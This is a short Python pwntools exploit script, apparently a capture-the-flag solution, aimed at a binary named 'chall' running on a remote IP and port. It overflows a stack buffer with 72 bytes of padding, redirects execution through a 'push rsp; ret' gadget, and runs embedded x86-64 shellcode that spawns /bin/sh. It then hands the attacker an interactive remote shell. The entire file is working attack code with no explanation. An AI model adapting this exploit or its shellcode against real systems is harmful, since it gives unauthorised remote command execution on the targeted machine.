#!/usr/bin/python3
from pwn import *

#shell = gdb.debug("./chall", "continue")
#shell = process("./chall")
shell = remote("54.91.159.197", 4477)

shellcode = b"\x6a\x3b\x58\x99\x52\x5e\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x0f\x05"

offset = 72
junk = b"A" * offset

payload  = b""
payload += junk
payload += p64(0x40126c) # push rsp; ret;
payload += shellcode

shell.sendlineafter(b": ", payload)
shell.interactive()
